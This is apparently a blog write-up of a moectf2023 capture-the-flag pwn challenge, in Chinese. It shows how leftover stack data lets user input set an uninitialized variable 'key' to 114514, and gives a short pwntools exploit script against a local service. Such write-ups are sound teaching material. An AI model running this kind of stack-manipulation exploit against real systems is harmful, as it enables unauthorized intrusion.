---
title: moectf2023 - uninitialized key plus
date: 2023/9/23 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 利用GDB探测并填充栈，成功将变量key设置为114514以解题。
---

## 文件分析

下载`uninitialized_key_plus`, 保护全开  
ghidra分析为64位程序

## 解题思路

和上次一样，使得栈上变量key==114514即可  
使用gdb发送'111122223333444455556666'进行探测（共读入24B），
发现输入无意义字符后key上留下来的值是`'6666'`，故填充前面段，将6666设为114514即可

## EXPLOIT

```python
from pwn import *
sh = remote("localhost", 41675)
sh.sendline(b'0'*20 + p32(114514))
sh.sendline(b'asdfasdf')
sh.interactive()
```

Done.
